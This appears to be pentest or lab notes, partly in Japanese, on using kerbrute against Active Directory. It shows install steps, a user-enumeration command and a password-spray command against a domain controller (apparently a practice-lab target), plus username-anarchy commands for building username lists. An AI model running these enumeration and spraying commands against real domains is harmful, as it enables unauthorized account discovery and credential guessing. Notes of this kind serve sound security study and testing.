# kerbrute
## Install
```zsh
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

## UserEnum
  ```zsh
kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.186.40 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 100
  ```

## PasswordSpray
```zsh
kerbrute passwordspray -d hokkaido-aerospace.com domain_users.txt rockyou.txt
```
### Kerberos事前認証無効アカウントの調査

#### Windows用のusernameファイルの作成
- 事前にkerbruteやenum4linux等でDCの名前のフォーマットを調べ、そのフォーマットに対応するようにファイルを作成します。

  - ファーストネーム・ラストネーム形式
    ```bash
    /home/kali/github/username-anarchy/username-anarchy --input-file ./users.txt --select-format first.last
    ```
    ![First.Last Format](https://github.com/user-attachments/assets/9ae9aadf-5c86-48fa-a248-013025577acc)

  - ファーストネームイニシャル・ラストネーム形式
    ```bash
    /home/kali/github/username-anarchy/username-anarchy --input-file ./users_Initial_lastname.txt --select-format flast
    ```
    ![FLast Format](https://github.com/user-attachments/assets/9eec67cc-3dc6-4a01-b2da-56d41336eee2)

  - 注意: 画面出力しかされないので、これらを含むテキストファイルを改めて作成します。